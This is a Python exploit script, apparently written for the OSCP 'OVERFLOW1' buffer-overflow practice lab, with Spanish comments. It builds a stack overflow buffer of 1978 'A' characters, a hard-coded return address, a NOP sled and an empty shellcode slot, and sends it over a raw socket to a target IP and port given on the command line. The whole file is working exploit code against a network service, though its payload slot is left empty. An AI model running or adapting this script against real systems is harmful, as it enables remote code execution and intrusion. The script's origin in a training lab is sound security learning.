""""
    Script para hace BOOOM!!.
    By: RoadLuck
"""
import argparse
import re

import socket

def socket_connection(ip, port, string):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  try:
    s.connect((ip, port))
    print("[*] Enviado Exploit...")
    s.send(bytes(string + "\r\n", "latin-1"))
    print("[+]Enviado")
  except:
    print("[!] No hay conexion.")


def is_valid_ip(ip):
  """
      Determina si la ip ingresada es valida.
  """
  regx = r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$"
  validator = re.match(regx,ip)
  if not validator:
      return False
  return validator

def main():
  parser = argparse.ArgumentParser("offset.py")
  parser.add_argument("-ip", help="Target IP server.", type=str)
  parser.add_argument("-p", "--port", help="Target Port", type=int, required=False, default=None)
  args = parser.parse_args()

  if args.ip is None or not is_valid_ip(args.ip):
      parser.error("-ip requiere de una ipv4 valida.")
  if args.port is None or (args.port < 0 or args.port > 65353):
      parser.error("-p, --port requiere de un puerto valido.")

  ip = args.ip
  port = args.port
  
  prefix = "OVERFLOW1 "
  offset = 1978 #Con este valor se rompe el buffer del programa oscp OVERFLOW1
  overflow = "A" * offset
  retn = "\xaf\x11\x50\x62"
  padding = "\x90" * 16
  payload = ""
  postfix = ""

  buffer = prefix + overflow + retn + padding + payload + postfix
  
  socket_connection(ip, port, buffer)

if __name__== '__main__':
  main()